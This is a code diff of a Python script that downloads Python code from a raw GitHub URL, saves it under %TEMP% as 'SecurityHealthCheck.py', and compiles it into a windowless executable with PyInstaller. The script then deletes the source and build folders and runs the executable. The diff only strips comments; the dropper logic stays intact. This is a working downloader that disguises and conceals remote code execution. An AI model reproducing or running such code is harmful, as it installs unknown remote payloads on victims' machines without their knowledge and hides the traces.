@@ -18,7 +18,7 @@ def fetch_python_code(url):
     req = urllib.request.Request(url, headers=headers)
     try:
         with urllib.request.urlopen(req) as response:
-            return response.read().decode('utf-8')  # Read the content as text
+            return response.read().decode('utf-8')
     except Exception as e:
         print(f"Error fetching URL {url}: {e}")
         return None
@@ -28,8 +28,8 @@ def write_python_file(code, filename):
         temp_dir = os.getenv('TEMP')
         py_file_path = os.path.join(temp_dir, filename)
         print(f"Writing to {py_file_path}")
-        with open(py_file_path, 'w', encoding='utf-8') as f:  # Specify utf-8 encoding
-            f.write(code)  # Write the Python code as text
+        with open(py_file_path, 'w', encoding='utf-8') as f:
+            f.write(code)
         return py_file_path
     return None
 
@@ -38,8 +38,7 @@ def compile_python_to_exe(py_file_path):
         try:
             print(f"Compiling {py_file_path}")
             temp_dir = os.getenv('TEMP')
-            
-            # Set --distpath and --workpath to %TEMP% to ensure all files are in %TEMP%
+
             dist_folder = os.path.join(temp_dir, "dist")
             build_folder = os.path.join(temp_dir, "build")
             
@@ -48,12 +47,11 @@ def compile_python_to_exe(py_file_path):
                 '--onefile',
                 '--noconsole',
                 '--icon=NONE',
-                f'--distpath={dist_folder}',  # Set dist path to %TEMP%
-                f'--workpath={build_folder}',  # Set work path to %TEMP%
+                f'--distpath={dist_folder}',
+                f'--workpath={build_folder}',
                 py_file_path
             ], check=True)
             
-            # Now, get the compiled .exe path from the dist folder in %TEMP%
             exe_file_path = os.path.join(dist_folder, os.path.basename(py_file_path).replace(".py", ".exe"))
             
             if os.path.exists(exe_file_path):
@@ -76,12 +74,10 @@ def execute_exe_file(exe_file_path):
             print(f"Error executing {exe_file_path}: {e}")
 
 def clean_up(py_file_path, dist_folder, build_folder):
-    # Delete Python file
     if os.path.exists(py_file_path):
         os.remove(py_file_path)
         print(f"Deleted Python file: {py_file_path}")
     
-    # Delete build and dist folders if they exist
     for folder in [dist_folder, build_folder]:
         if os.path.exists(folder):
             if os.path.isdir(folder):
@@ -94,7 +90,6 @@ urls_and_filenames = [
     ("https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/watchdog2", "SecurityHealthCheck.py"),
 ]
 
-# Fetch, write and compile Python files
 temp_dir = os.getenv('TEMP')
 python_files = []
 for url, filename in urls_and_filenames:
@@ -104,19 +99,16 @@ for url, filename in urls_and_filenames:
         if py_file_path:
             python_files.append(py_file_path)
 
-# Compile and move EXE files to %TEMP%
 exe_files = []
 for py_file_path in python_files:
     exe_file_path = compile_python_to_exe(py_file_path)
     if exe_file_path:
         exe_files.append(exe_file_path)
 
-# Cleanup the Python files, build, and dist folders after compilation
 for py_file_path in python_files:
     dist_folder = os.path.join(temp_dir, "dist")
     build_folder = os.path.join(temp_dir, "build")
     clean_up(py_file_path, dist_folder, build_folder)
 
-# Execute EXE files
 for exe_file_path in exe_files:
     execute_exe_file(exe_file_path)
